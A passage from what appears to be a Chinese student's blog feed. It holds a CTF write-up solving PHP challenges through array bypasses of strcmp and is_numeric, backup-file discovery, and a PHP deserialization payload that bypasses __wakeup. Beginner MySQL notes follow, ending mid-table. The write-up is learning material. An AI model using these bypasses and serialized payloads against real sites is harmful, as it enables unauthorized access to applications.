src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732974465192-84cfa94b-7369-4840-8850-16ecc492087a.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732959584400-658804cd-ead1-4858-a6d2-9a39bb99115d.png"></p><p><font style="color:rgb(0, 0, 0);">&#x3D;Level 3&#x3D;的if是一开始是比较字符串的大小，要求是值为0，即两个字符串相等。但是后</font>面是file_get_contents函数，函数里放的是flag，我们不知道flag里的东西所以无法传入字符串，但是查了一下strcmp()函数的知识发现该函数依然无法操作数组，会返回0，所以GET参数key4为一个数组即key4[]&#x3D;0,就绕过了<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732974480391-5778d845-3eb8-4dcc-83f6-26da25742bb0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732968112955-35a1fe90-9d2e-4e98-a80f-97439e94ddd9.png"></p><p><font style="color:rgb(0, 0, 0);">&#x3D;Level 4&#x3D; 的if是用的</font>is_numeric 函数来比较，它是用于检查一个变量是否是数字或数字字符串，<font style="color:rgb(77, 77, 77);">，是的话返回1，但是is_numeric()无法解析数组会返回false。</font>所以还是数组绕过,且数组的值大于2023，所以传入key5[]&#x3D;2024绕过<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732974513576-0e792c87-2fa2-42d7-9da2-5272574cb1f8.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732973838669-614305f5-7af9-4fb2-b0f8-57af31f77599.png"></p><p><font style="color:rgb(0, 0, 0);">&#x3D;Level 5&#x3D;的i</font><font style="color:rgb(0, 0, 0);">f，由</font><font style="color:rgb(51, 51, 51);">is_numeric() 函数不能匹配a-zA-Z0-9可知</font><font style="color:rgb(77, 77, 77);">这里要输入的POST内容不能是字母和数字，并且下一关只有flag5为真才输出flag，所以在这里需要给flag5赋值一个符号就行，给数组也行。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733045245412-04f283c6-1a3e-4a62-a138-1c4c13304116.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975009403-21caa187-05cf-4882-b262-41837c46de85.png"></p><p>说实话，这道题从<font style="color:rgb(0, 0, 0);">&#x3D;Level 1&#x3D;到&#x3D;Level 5&#x3D;</font>也确实都可以使用数组绕过。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732975135750-eb38bf12-7a7f-4a8f-bfab-987ad6895a5d.png"></p><p>提交flag，游戏结束。</p><h2 id="5-极客大挑战-2019-PHP"><a href="#5-极客大挑战-2019-PHP" class="headerlink" title="5.[极客大挑战 2019]PHP"></a>5.<font style="color:rgb(33, 37, 41);">[极客大挑战 2019]PHP</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733047357591-9be85885-17ed-478d-9ac9-cd4287551d32.png"></p><p>进去是一只可爱的猫猫，随着鼠标的移动，那个球也在移动，当球靠近猫猫时，猫猫还在布拉球，真是卡哇伊</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733047381419-1a8adf60-a6be-492d-b469-3bed373e38fb.png"></p><p>页面上没有什么信息，我的思路是先到元素和网页源代码看看有没有什么有用的信息<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733062959530-900f8a51-30ed-4d5f-8474-31f6705c427f.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733062693535-878d9200-59b9-451a-a0c1-3a359daa72fa.png"></p><p>下面是几个网址，看了一下，都是一堆代码，仔细看也没有关键信息，猜了一下，这大概是页面猫猫的代码吧</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733062736257-fef954cb-b4ca-43c8-af48-602d6abc5777.png"></p><p>即使有高亮部分也是注释或者其他的与题目无关的代码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733063028477-c1f5148b-342a-4c54-846b-4729cc9900e0.png"></p><p>这道题一开始确实是没有思路，但是页面上的这句话”<font style="color:#74B602;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</font><font style="color:rgb(0, 0, 0);">“</font>帮我打开了一下思路，查了查网站备份的相关知识</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733047819851-60d054db-f768-47bf-81db-64b53e8518e4.png"></p><p>所以我猜测flag应该是藏在了某个文件里了，我是从zip开始尝试的，毕竟zip是压缩包的后缀，比较熟悉的</p><p>在这里输入web.zip、website.zip、zipbackup.zip，back.zip都不行</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733063849858-2be289f8-a515-4fd1-a37a-02210d1ee735.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733063864694-b99e5fd4-0f36-48f6-a396-5298463e72dc.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733063808308-e1e7a84a-1842-4ed7-b2cd-22eaf99b1add.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733063809578-cc020234-7d75-4962-b83a-e50c4604df9a.png"></p><p>到了<a href="http://www.zip试了一下,结果下载了一个压缩包,说明方向是正确的,网站备份文件就找到了,flag肯定就藏在里面/">www.zip试了一下，结果下载了一个压缩包，说明方向是正确的，网站备份文件就找到了，flag肯定就藏在里面</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733048235914-19e60206-4dc8-4206-82a4-1f6d5e4d4625.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733048285085-88873da1-f8c2-46ee-84e5-e75573919a5b.png"></p><p>解压后是这样的，有flag.php，打开后的东西如下图所示，wc，dog？我要的是cat，这肯定是假的flag,</p><p>~~ 真狗，666~~，直接删了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733048401573-69d04688-6da1-4905-ac56-d39a8f8121d1.png"></p><p>也找了其他的文件，最后在class.php这里找到了flag。<font style="color:rgb(77, 77, 77);">在这个里面我们可以知道如果password不等于100则接下来会执行到die退出程序，如果username不等于admin则会直接绕过flag执行输出”hello my friend~~sorry i can’t give you the flag!“只有username&#x3D;admin，password&#x3D;100，才可拿到flag。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733048700721-e7d868e2-8b42-4c45-a085-a148a5c15c2d.png"></p><p>仔细分析一下代码：这里一开始是包含flag.php的，然后有一个类，两个私有变量$username，$password。之后构造函数建立了一个一 一对应的关系，wakeup会把username换成guest。所以username在wakeup函数那里就会变为guest就不可能是admin，所以我们的目标是绕过这个wakeup函数。查了一下资料，<font style="color:rgb(77, 77, 77);">一般做CTF题目时绕过wakeup的方法就是：先序列化字符串，然后使</font><strong><font style="color:rgb(77, 77, 77);">序列化后</font></strong><font style="color:rgb(77, 77, 77);">字符串中属性的个数大于真实对象中属性的个数，即可绕过wakeup魔术方法。</font></p><p>所以写代码来序列化它一下(因为<font style="color:rgb(77, 77, 77);">username&#x3D;admin，password&#x3D;100，所以Name里的两个参数分别为’admin’、100</font>)。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733070746957-3e9f992e-c809-461d-902c-7a27d1379dac.png"></p><p>序列化的结果如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733070746781-d4998406-3c45-46d9-a4b6-bbd6a5796a01.png"></p><p><font style="color:rgb(77, 77, 77);">因为序列化后字符串中属性的个数大于真实对象中属性的个数，即可绕过wakeup，</font>所以要把</p><p>”<font style="color:rgb(0, 0, 0);">O:4:”Name”:</font><font style="color:#DF2A3F;">2</font><font style="color:#000000;">:</font><font style="color:rgb(0, 0, 0);">{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}“中”Name”:后面的</font><font style="color:#DF2A3F;">2</font><font style="color:rgb(0, 0, 0);">改为比2大的数（我用的是3）即可,注意空字符！！！(我在这里卡了半小时才发现问题)。所以修改后的序列化的字符如下：</font></p><p><font style="color:rgb(0, 0, 0);">O:4:”Name”</font><font style="color:#000000;">:</font><font style="color:#DF2A3F;">3</font><font style="color:rgb(0, 0, 0);">:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</font></p><p>其他文件也是要看一眼的，在index.php这里找到了PHP代码，知道了这是通过select来GET传参。<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733048783125-1d33677f-3d04-48ec-943d-a5a194d81b2d.png"></p><p>所以，提交</p><p>?select&#x3D;O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733072348469-3b470e55-6ba0-4405-9648-278146c165af.png"></p><p>然后，flag就出来了，提交完事。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1733050002247-de8cb6f1-11b2-40e8-92a4-1bf7d2cf13b9.png"></p><p>这一周先写到这里啦，这一周又是改视频又是密码技术决赛志愿者，太累了，休息一下啦</p>]]></content>
      
      
      <categories>
          
          <category> HelloWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Knowledge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习</title>
      <link href="/2024/11/24/HelloWeb/MySQL%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/24/HelloWeb/MySQL%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>写这篇学习笔记时，参考视频为：<p>【MySQL数据库基础教程_数据库_小白零基础带你掌握SQL数据库_包括（下载、安装和卸载）_小白必看】 <a href="https://www.bilibili.com/video/BV1y2mKYQEeg/?share_source=copy_web&vd_source=26a21a8ac3f19fd0d663fb58dee41081">https://www.bilibili.com/video/BV1y2mKYQEeg/?share_source&#x3D;copy_web&amp;vd_source&#x3D;26a21a8ac3f19fd0d663fb58dee41081</a></p><p>参考资料为：《MySQL5.7从入门到精通（视频教学版)（第二版)》<img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732439739987-2505f73b-5f12-4efd-9a11-ec436d011f6f.jpeg"></p><h1 id="一、SQL-概述"><a href="#一、SQL-概述" class="headerlink" title="一、SQL 概述"></a><font style="color:rgb(51, 51, 51);">一、SQL 概述</font></h1><h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a><font style="color:rgb(51, 51, 51);">1.基本概念</font></h2><p><strong><font style="color:rgb(51, 51, 51);">SQL</font></strong><font style="color:rgb(51, 51, 51);"> (Structured Query Language:结构化查询语言) 是用于管理关系数据库管理系统（RDBMS）。</font></p><p><font style="color:rgb(51, 51, 51);">SQL 通过一系列的语句和命令来执行数据定义、数据查询、数据操作和数据控制等功能,包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。</font></p><h2 id="2-SQL-分类"><a href="#2-SQL-分类" class="headerlink" title="2.SQL 分类"></a><font style="color:rgb(51, 51, 51);">2.SQL 分类</font></h2><p><font style="color:rgb(51, 51, 51);">DDL（Data Definition Language）：数据定义语言，用来定义数据库对象：库、表、列等；</font></p><p><font style="color:rgb(51, 51, 51);">DML（Data Manipulation Language）：数据操作语言，用来定义数据库记录（数据）；</font></p><p><font style="color:rgb(51, 51, 51);">DCL（Data Control Language）：数据控制语言，用来定义访问权限和安全级别；</font></p><p><font style="color:rgb(51, 51, 51);">DQL（Data Query Language）：数据查询语言，用来查询记录（数据）</font></p><h2 id="3-语法要求"><a href="#3-语法要求" class="headerlink" title="3.语法要求"></a><font style="color:rgb(79, 79, 79);">3.语法要求</font></h2><p><font style="color:rgba(0, 0, 0, 0.75);">SQL 语句可以单行或多行书写，以分号结尾；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">可以用空格和缩进来来增强语句的可读性；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">关键字不区别大小写；</font></p><h2 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4.数据类型"></a><font style="color:rgba(0, 0, 0, 0.75);">4.数据类型</font></h2><p><font style="color:rgba(0, 0, 0, 0.75);">MySQL 与 Java、C 一样，也有数据类型MySQL 中数据类型主要应用在列上。</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">常用类型：</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">int：整型</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">double：浮点型，例如 double(5,2)表示最多 5 位，其中必须有 2 位小数，即最大值为 999.99；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">decimal：泛型型，在表单线方面使用该类型，因为不会出现精度缺失问题；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">char：固定长度字符串类型；(当输入的字符不够长度时会补空格)</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">varchar：固定长度字符串类型；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">text：字符串类型；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">blob：字节类型；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">date：日期类型，格式为：yyyy-MM-dd；</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">time：时间类型，格式为：hh:mm:ss</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">timestamp：时间戳类型；</font></p><p>参考资料：<a href="https://blog.csdn.net/PILIpilipala/article/details/113798383">https://blog.csdn.net/PILIpilipala/article/details/113798383</a></p><h1 id="二、MySQL概述"><a href="#二、MySQL概述" class="headerlink" title="二、MySQL概述"></a>二、MySQL概述</h1><h2 id="1-MySQL是什么"><a href="#1-MySQL是什么" class="headerlink" title="1.MySQL是什么"></a>1.MySQL是什么</h2><p>MySQL是一个小型关系数据库管理系统，它虽然规模小、功能有限，但是它体积小、速度快、成本低，且提供的功能对于稍微复杂的应用来说已经够用了，这些特性使得它成为世界上最受欢迎的开放源代码数据库。</p><h2 id="2-MySQL的安装与配置"><a href="#2-MySQL的安装与配置" class="headerlink" title="2.MySQL的安装与配置"></a>2.MySQL的安装与配置</h2><h3 id="MySQL的安装"><a href="#MySQL的安装" class="headerlink" title="MySQL的安装"></a>MySQL的安装</h3><p>在<a href="https://dev.mysql.com/downloads/windows/installer/">https://dev.mysql.com/downloads/windows/installer/</a>下载5.7.44版本，这时候会弹出登录界面，按照页面提示注册好就可以下载了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732009691202-90de94dc-fd68-4b86-ad14-39c716853d9d.png"></p><p><font style="color:rgb(51, 51, 51);">下载好后进行安装，这几步忘截图了，就放参考书上的图片了，提醒一下中间设置的密码一定不能忘</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732010902781-29583f3f-65fd-4040-82e1-ae6b081310b2.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732010932242-a0156a80-42ae-4c70-95eb-9f39f89bae4b.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732010952294-8bd0c13a-7745-4e5f-963a-8034b27dca77.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732010977524-946a9ab4-097e-4399-8312-15ba362bfb6b.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732010989782-acafd647-9f85-4432-9dfa-d7f7cb885114.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732011552665-8bd60b45-d4ba-40fd-aea1-ee57d406f7bb.jpeg"><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/50616406/1732011571498-fb749614-98fe-4ddd-95c8-4e6d4919a3fa.jpeg"></p><p>这下算是已经安装好了，接下来还要启动服务器</p><p>打开搜索栏搜索services.msc，并打开</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079017710-9b46f6c6-d5f8-476f-89ad-a72c245d9487.png"></p><p>启用MySQL服务</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079087554-313e3106-4ed3-493a-86c3-4b3e78d2337f.png"></p><h3 id="登录MySQL服务"><a href="#登录MySQL服务" class="headerlink" title="登录MySQL服务"></a>登录MySQL服务</h3><p>在搜索栏输入MySQL 5.7 Command Line Client并打开<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079554834-658b15a4-96e3-4096-b06e-8f6abbc64214.png"></p><p>输入密码就登录了MySQL数据库</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079627844-288eeea7-0e1a-4253-84fa-da87b2234989.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079690397-2074376f-5de8-4932-ba79-80e62eb1be80.png"></p><h3 id="配置path变量"><a href="#配置path变量" class="headerlink" title="配置path变量"></a>配置path变量</h3><p>在桌面上右键此电脑点击属性，打开系统窗口，单击高级系统设置链接，打开系统属性对话框单机环境变量</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732079970005-df92ec75-1ac6-4dcb-8f0c-1317072d77bf.png"></p><p>之后选择path点击编辑把MySQL Server 5.7\bin的路径复制上去</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732080030847-47f8dc82-13f2-4947-b24d-6ae8139657f7.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732080043800-e3e77b34-3bc1-48eb-b66f-d4c96ab8579e.png"></p><p>点击确定这样就完成了path的配置，之后就可以直接输入MySQL指令来登录数据库了</p><h1 id="三、数据库的基本操作"><a href="#三、数据库的基本操作" class="headerlink" title="三、数据库的基本操作"></a>三、数据库的基本操作</h1><h2 id="1-创建数据库"><a href="#1-创建数据库" class="headerlink" title="1.创建数据库"></a>1.创建数据库</h2><p>在MySQL自带的客户端工具登录后显示<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732206876871-e797b743-d322-410f-b884-2484a5d583ef.png"></p><p>接下来查看已有数据库，输入语句来查看：</p><p><em><strong><font style="color:#601BDE;">show databases;</font></strong></em></p><p>注意databases是有复数的，且末尾分号不要忘。</p><p>可以看到数据库中有4个数据库，其中mysql是必须的，用于用户访问权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732206781434-bb1193eb-9630-44d6-8037-b3d3cdac2600.png"></p><p>创建数据库的输入语句格式为：</p><p><em><strong><font style="color:#601BDE;">create database </font></strong></em> <em><strong>数据库名 ;</strong></em></p><p>比如说现在要创建一个名为fischl0527的数据库，需要输入：“create database fischl0527;”，注意database不加-s，后面需要有分号表示语句结束。<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732208444297-38834837-8a9f-4676-afa2-bffe5cc5d6d5.png"></p><h2 id="2-查看数据库"><a href="#2-查看数据库" class="headerlink" title="2.查看数据库"></a>2.查看数据库</h2><p>如果我们想要查看某一个数据库，使用以下语句：</p><p><em><strong><font style="color:#601BDE;"> show create database </font></strong></em> <em><strong>数据库名;</strong></em></p><p>如果我们想要查看某一个数据库的定义，可以使用：</p><p><em><strong><font style="color:#601BDE;">show create database </font></strong></em> <em><strong>数据库名</strong></em> <em><strong><font style="color:#601BDE;">\G;</font></strong></em></p><p><font style="color:#000000;">比如说现在要查看一个名为text的数据库,需要输入：“show create database text;”</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732262439785-bc68f251-30fe-4455-8c8d-db42ece88fdf.png"></p><p>比如说现在要查看一个名为egg的数据库的定义，需要输入：“show create database egg\G;”<img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732208375912-be9fff65-b938-40f7-9bd8-f2ae85350d9d.png"></p><h2 id="3-删除数据库"><a href="#3-删除数据库" class="headerlink" title="3.删除数据库"></a>3.删除数据库</h2><p>如果我们想要删除一个数据库，输入语句格式如下：</p><p><em><strong><font style="color:#601BDE;"> drop database </font></strong>__<strong>数据库名</strong></em><strong><font style="color:#601BDE;"> ;</font></strong></p><p>比如说现在要删除一个名为fischl0527的数据库，需要输入：“drop database fischl0527;”</p><p>此时我们再查看所有数据库就已经没有了“fischl0527”这个数据库了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732207720256-3e784a36-a140-4807-9edd-6835ecbb7094.png"></p><p>如果再次查看fischl数据库时，执行结果会报错</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732208118432-6e150c27-c385-449a-af1d-e85d7e12488e.png"></p><p>并且要注意删除数据库时MySQL不会给出任何确认信息，删除数据库后所有数据表、数据不可恢复，因此删除数据库时一定要小心谨慎。</p><h1 id="四、数据表的基本操作"><a href="#四、数据表的基本操作" class="headerlink" title="四、数据表的基本操作"></a>四、数据表的基本操作</h1><h2 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1.数据类型"></a>1.数据类型</h2><h3 id="1-数值类型："><a href="#1-数值类型：" class="headerlink" title="(1) 数值类型："></a><font style="color:rgb(51, 51, 51);">(1) 数值类型：</font></h3><p>数值类型的长度m是指显示长度，并不表示存储长度，只有字段指定zerofill时有用</p><p>例如：int（3)，如果实际值是2，如果列指定了zerofill，那查询结果是002，左边的0用来填充</p><p>在浮点类型中，（m,d)，m为总位数，d为小数位。</p><table><thead><tr><th><font style="color:rgb(255, 255, 255);">类型</font></th><th><font style="color:rgb(255, 255, 255);">大小</font></th><th><font style="color:rgb(255, 255, 255);">范围（有符号）</font></th><th><font style="color:rgb(255, 255, 255);">范围（无符号）</font></th><th><font style="color:rgb(255, 255, 255);">用途</font></th></tr></thead><tbody><tr><td><font style="color:rgb(51, 51, 51);">tinyint(m)</font></td><td><font style="color:rgb(51, 51, 51);">1 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-128，127)</font></td><td><font style="color:rgb(51, 51, 51);">(0，255)</font></td><td><font style="color:rgb(51, 51, 51);">小整数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">smallint(m)</font></td><td><font style="color:rgb(51, 51, 51);">2 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-32 768，32 767)</font></td><td><font style="color:rgb(51, 51, 51);">(0，65 535)</font></td><td><font style="color:rgb(51, 51, 51);">大整数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">mediumint(m)</font></td><td><font style="color:rgb(51, 51, 51);">3 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-8 388 608，8 388 607)</font></td><td><font style="color:rgb(51, 51, 51);">(0，16 777 215)</font></td><td><font style="color:rgb(51, 51, 51);">大整数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">int(m)或integer(m)</font></td><td><font style="color:rgb(51, 51, 51);">4 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-2 147 483 648，2 147 483 647)</font></td><td><font style="color:rgb(51, 51, 51);">(0，4 294 967 295)</font></td><td><font style="color:rgb(51, 51, 51);">大整数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">bigint(m)</font></td><td><font style="color:rgb(51, 51, 51);">8 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</font></td><td><font style="color:rgb(51, 51, 51);">(0，18 446 744 073 709 551 615)</font></td><td><font style="color:rgb(51, 51, 51);">极大整数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">float(m，d)</font></td><td><font style="color:rgb(51, 51, 51);">4 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</font></td><td><font style="color:rgb(51, 51, 51);">0，(1.175 494 351 E-38，3.402 823 466 E+38)</font></td><td><font style="color:rgb(51, 51, 51);">单精度   </font><font style="color:rgb(51, 51, 51);">浮点数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">double(m,d)</font></td><td><font style="color:rgb(51, 51, 51);">8 Bytes</font></td><td><font style="color:rgb(51, 51, 51);">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</font></td><td><font style="color:rgb(51, 51, 51);">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</font></td><td><font style="color:rgb(51, 51, 51);">双精度   </font><font style="color:rgb(51, 51, 51);">浮点数值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">decimal(m,d)</font></td><td><font style="color:rgb(51, 51, 51);">对decimal(M,D) ，如果M&gt;D，为M+2否则为D+2</font></td><td><font style="color:rgb(51, 51, 51);">依赖于M和D的值</font></td><td><font style="color:rgb(51, 51, 51);">依赖于M和D的值</font></td><td><font style="color:rgb(51, 51, 51);">小数值</font></td></tr></tbody></table><h3 id="2-日期和时间类型："><a href="#2-日期和时间类型：" class="headerlink" title="(2) 日期和时间类型："></a><font style="color:rgb(51, 51, 51);">(2) 日期和时间类型：</font></h3><p>datatime不支持跨时区，它没有时区处理timestamp是有时间戳的，支持时区处理。</p><table><thead><tr><th><font style="color:rgb(255, 255, 255);">类型</font></th><th><font style="color:rgb(255, 255, 255);">大小   </font><font style="color:rgb(255, 255, 255);">( bytes)</font></th><th><font style="color:rgb(255, 255, 255);">范围</font></th><th><font style="color:rgb(255, 255, 255);">格式</font></th><th><font style="color:rgb(255, 255, 255);">用途</font></th></tr></thead><tbody><tr><td><font style="color:rgb(51, 51, 51);">date</font></td><td><font style="color:rgb(51, 51, 51);">3</font></td><td><font style="color:rgb(51, 51, 51);">1000-01-01&#x2F;9999-12-31</font></td><td><font style="color:rgb(51, 51, 51);">YYYY-MM-DD</font></td><td><font style="color:rgb(51, 51, 51);">日期值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">time</font></td><td><font style="color:rgb(51, 51, 51);">3</font></td><td><font style="color:rgb(51, 51, 51);">‘-838:59:59’&#x2F;‘838:59:59’</font></td><td><font style="color:rgb(51, 51, 51);">HH:MM:SS</font></td><td><font style="color:rgb(51, 51, 51);">时间值或持续时间</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);"></font></td><td><font style="color:rgb(51, 51, 51);"></font></td><td><font style="color:rgb(51, 51, 51);"></font></td><td><font style="color:rgb(51, 51, 51);"></font></td><td><font style="color:rgb(51, 51, 51);"></font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">year</font></td><td><font style="color:rgb(51, 51, 51);">1</font></td><td><font style="color:rgb(51, 51, 51);">1901&#x2F;2155</font></td><td><font style="color:rgb(51, 51, 51);">YYYY</font></td><td><font style="color:rgb(51, 51, 51);">年份值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">datatime</font></td><td><font style="color:rgb(51, 51, 51);">8</font></td><td><font style="color:rgb(51, 51, 51);">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</font></td><td><font style="color:rgb(51, 51, 51);">YYYY-MM-DD hh:mm:ss</font></td><td><font style="color:rgb(51, 51, 51);">混合日期和时间值</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">timestamp</font></td><td><font style="color:rgb(51, 51, 51);">4</font></td><td><font style="color:rgb(51, 51, 51);">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC</font><br/><font style="color:rgb(51, 51, 51);">结束时间是第</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">2147483647</font></strong><font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">秒，北京时间</font><font style="color:rgb(51, 51, 51);"> </font><strong><font style="color:rgb(51, 51, 51);">2038-1-19 11:14:07</font></strong><font style="color:rgb(51, 51, 51);">，格林尼治时间 2038年1月19日 凌晨 03:14:07</font></td><td><font style="color:rgb(51, 51, 51);">YYYY-MM-DD hh:mm:ss</font></td><td><font style="color:rgb(51, 51, 51);">混合日期和时间值，时间戳</font></td></tr></tbody></table><h3 id="3-字符串类型："><a href="#3-字符串类型：" class="headerlink" title="(3) 字符串类型："></a><font style="color:rgb(51, 51, 51);">(3) 字符串类型：</font></h3><p>char(n)和varchar(n)中n指的是字符的总长度,并且在char中的n是固定长度，当字符数小于n时，MySQL会用空格在前面来补齐；但是varchar的n是表示最大长度，长度不够时，不会用空格来补齐。所以在使用char(n)和varchar(n)时必须指定字符长度。</p><p>text不需要指定长度，当不知道属性长度时，适合用text。</p><p>查询速度char最快，varchar次之，text最慢。</p><p>blob是二进制数据，blob和text存储方式不同，text是以文本方式存储的，blob是以二进制方式存储的。blob存储的数据只能整体读出。text可以指定字符集，blob不用指定字符集。</p><table><thead><tr><th><font style="color:rgb(255, 255, 255);">类型</font></th><th><font style="color:rgb(255, 255, 255);">大小</font></th><th><font style="color:rgb(255, 255, 255);">用途</font></th></tr></thead><tbody><tr><td><font style="color:rgb(51, 51, 51);">char(n)</font></td><td><font style="color:rgb(51, 51, 51);">0-255 bytes</font></td><td><font style="color:rgb(51, 51, 51);">定长字符串</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">varchar(n)</font></td><td><font style="color:rgb(51, 51, 51);">0-65535 bytes</font></td><td><font style="color:rgb(51, 51, 51);">变长字符串</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">tinyblob</font></td><td><font style="color:rgb(51, 51, 51);">0-255 bytes</font></td><td><font style="color:rgb(51, 51, 51);">不超过 255 个字符的二进制字符串</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">tinytext</font></td><td><font style="color:rgb(51, 51, 51);">0-255 bytes</font></td><td><font style="color:rgb(51, 51, 51);">短文本字符串</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">blob</font></td><td><font style="color:rgb(51, 51, 51);">0-65 535 bytes</font></td><td><font style="color:rgb(51, 51, 51);">二进制形式的长文本数据</font></td></tr><tr><td><font style="color:rgb(51, 51, 51);">text</font></td><td><font style="color:rgb(51, 51, 51);">0-65 535 bytes</font></td><td><font style="color:rgb(51, 51, 